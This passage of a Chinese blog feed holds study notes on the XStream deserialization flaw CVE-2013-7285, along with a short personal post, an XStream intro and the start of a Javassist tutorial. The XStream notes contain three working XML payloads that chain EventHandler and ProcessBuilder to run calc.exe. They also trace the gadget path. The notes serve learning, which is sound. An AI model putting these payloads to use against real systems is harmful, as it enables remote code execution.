class="headerlink" title="蛋糕"></a>蛋糕</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141750347.jpg" alt="014476fafa3edcd47f3abcc2e832f55"></p><p>提出严重批评，浪费！</p><h2 id="离谱"><a href="#离谱" class="headerlink" title="离谱"></a>离谱</h2><p>我亲爱的宝贝连着吃了几天的好吃的。然后回学校，明明很累。然后还不饿。结果晚上吃泡面。属实让我无语住了，下次带猪儿出去吃草。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203141758553.png" alt="image-20220314175849105"></p>]]></content>
    
    
    <categories>
      
      <category>游玩记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爱情</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStream（CVE-2013-7285）</title>
    <link href="/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/"/>
    <url>/2022/03/10/XStream%EF%BC%88CVE-2013-7285%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="XStream（CVE-2013-7285）"><a href="#XStream（CVE-2013-7285）" class="headerlink" title="XStream（CVE-2013-7285）"></a>XStream（CVE-2013-7285）</h1><p>看了很多博主，还是<a href="http://www.mi1k7ea.com/2019/10/21/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">mi1k7ea</a>师傅写的好。（哈哈哈建议直接跳转页面），我写的只供自己复习。</p><p>上一篇复习到类似cc链的一个类。<strong>EventHandle</strong>，并且实现了弹出计算器。还了解了其如何反序列化。<br>这里要补充一个新知识点。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101719235.png" alt="QQ截图20220310164057"></p><p><strong>dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</strong></p><h2 id="POC（基于接口）"><a href="#POC（基于接口）" class="headerlink" title="POC（基于接口）"></a>POC（基于接口）</h2><p><strong>该接口可以是任意的public接口。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;dynamic-proxy&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;interface&gt;com.thoughtworks.xstream.io.HierarchicalStreamReader&lt;/interface&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        \t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;            &lt;/command&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;/target&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;        &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;    &lt;/handler&gt;\n&quot;</span> +<br>              <span class="hljs-string">&quot;&lt;/dynamic-proxy&gt;&quot;</span>;<br>      <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>      <span class="hljs-type">HierarchicalStreamReader</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> (HierarchicalStreamReader)xStream.fromXML(s);<br>      obj.hasMoreChildren();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的<code>command</code>是<code>ProcessBuilder</code>接收的参数。</p><p>target同理。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101717586.png" alt="QQ截图20220310171656"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">obj.hasMoreChildren(); <span class="hljs-regexp">//</span>这一步相当于触发访问接口这一条件。<br></code></pre></td></tr></table></figure><h2 id="POC（基于SortedSet）"><a href="#POC（基于SortedSet）" class="headerlink" title="POC（基于SortedSet）"></a>POC（基于SortedSet）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.io.HierarchicalStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XStreamDemo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;sorted-set&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;string&gt;test&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/sorted-set&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>    xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单总结一下。<br>在调试过程中。由于在这里进入<strong>putAll()</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101909251.png" alt="QQ截图20220310190929"></p><p>跟进！<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101902229.png" alt="QQ截图20220310190110"></p><p>这里我们会发现调用了，<strong>comparator</strong>，也就是说我们就触发了。接口这个条件。达到弹出计算器。</p><h2 id="POC（基于TreeMap）"><a href="#POC（基于TreeMap）" class="headerlink" title="POC（基于TreeMap）"></a>POC（基于TreeMap）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XstreamDemo2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;tree-map&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;xsw6_a&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;handler class=\&quot;java.beans.EventHandler\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;target class=\&quot;java.lang.ProcessBuilder\&quot;&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \t\t\t\t\t\t\t\t&lt;string&gt;calc.exe&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    &lt;/command&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;/target&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &lt;action&gt;start&lt;/action&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;            &lt;/handler&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &lt;string&gt;good&lt;/string&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &lt;/entry&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/tree-map&gt;&quot;</span>;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>         xStream.fromXML(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203101910615.png" alt="QQ截图20220310191043"></p><p>事实上是同理的。</p><p><strong>总结：想法设法触发接口。</strong></p><p>在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XStream（入门）</title>
    <link href="/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/"/>
    <url>/2022/03/09/Xstream%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Xstream-入门"><a href="#Xstream-入门" class="headerlink" title="Xstream(入门)"></a>Xstream(入门)</h1><h2 id="Demo（序列化）"><a href="#Demo（序列化）" class="headerlink" title="Demo（序列化）"></a>Demo（序列化）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span>  String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        person.setName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        person.setAge(<span class="hljs-number">20</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> xStream.toXML(person);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092211796.png" alt="QQ截图20220309221126"></p><h2 id="Demo（反序列化）"><a href="#Demo（反序列化）" class="headerlink" title="Demo（反序列化）"></a>Demo（反序列化）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.thoughtworks.xstream.XStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Unserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">XStream</span> <span class="hljs-variable">xStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;xsw6a.Person&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;age&gt;20&lt;/age&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;  &lt;name&gt;xsw6_a&lt;/name&gt;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&lt;/xsw6a.Person&gt;&quot;</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> xStream.fromXML(s);<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092257563.png" alt="QQ截图20220309225653"></p><p>这个类继承了，<strong>InvocationHandler</strong>。是不是很熟悉，一下就想到了cc链中的那个ann那个类。<strong>那么只要代理这个类，就会执行这个类的invoke方法。</strong><br>看一下如何走的。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092301876.png" alt="QQ截图20220309230131"></p><p>一路跟进会来到这里。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203092312104.png" alt="QQ截图20220309230859"></p><p>这里会调用反射。</p><p>所以能够弹出计算器。</p><ul><li>targetMethod：ProcessBuilder.start()方法 （action参数）</li><li>target：构造好带有恶意命令的ProcessBuilder对象</li></ul><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6_a;<br><br><span class="hljs-keyword">import</span> java.beans.EventHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">HelloService</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTrue</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HelloService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Apple</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃苹果&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Bananer</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;吃香蕉&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tester</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloTrue</span>();<br>        <span class="hljs-type">EventHandler</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>), <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HelloService) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);<br>        o.Apple();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javasist</title>
    <link href="/2022/03/09/Javasist/"/>
    <url>/2022/03/09/Javasist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javasist"><a href="#Javasist" class="headerlink" title="Javasist"></a>Javasist</h1><p><strong>可以更简单、快速的编辑和创建Java字节码的类库。我们知道 Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</strong></p><p>用几个案例来学习。（从网上搜刮的，如有雷同请联系作者删除）</p><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><h3 id="Hello类"><a href="#Hello类" class="headerlink" title="Hello类"></a>Hello类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syaHello</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;h3h3h3&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="主类"><a href="#主类" class="headerlink" title="主类"></a>主类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>);<br>        syaHello.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;我要把你变成xsw6_a\&quot;);&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br>        hello.syaHello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault(); <span class="hljs-comment">//类库，jvm中所加载的class</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>); <span class="hljs-comment">//获取已知类</span><br></code></pre></td></tr></table></figure><h3 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">tMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>); <span class="hljs-comment">//获取已知方法</span><br></code></pre></td></tr></table></figure><h2 id="修改方法中的类容"><a href="#修改方法中的类容" class="headerlink" title="修改方法中的类容"></a>修改方法中的类容</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">syaHello.setBody(<span class="hljs-string">&quot;System.out.println(<span class="hljs-subst">\&quot;</span>我要把你变成xsw6_a<span class="hljs-subst">\&quot;</span>);&quot;</span>); \\覆盖原始的内容。<br></code></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>这里会完全覆盖原有方法里面的内容。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091712635.png" alt="QQ截图20220309171203"></p><h2 id="加载修改后的类"><a href="#加载修改后的类" class="headerlink" title="加载修改后的类"></a>加载修改后的类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass(); <span class="hljs-comment">//使用当前Classloader加载修改后的类。</span><br></code></pre></td></tr></table></figure><h2 id="将其实例化"><a href="#将其实例化" class="headerlink" title="将其实例化"></a>将其实例化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 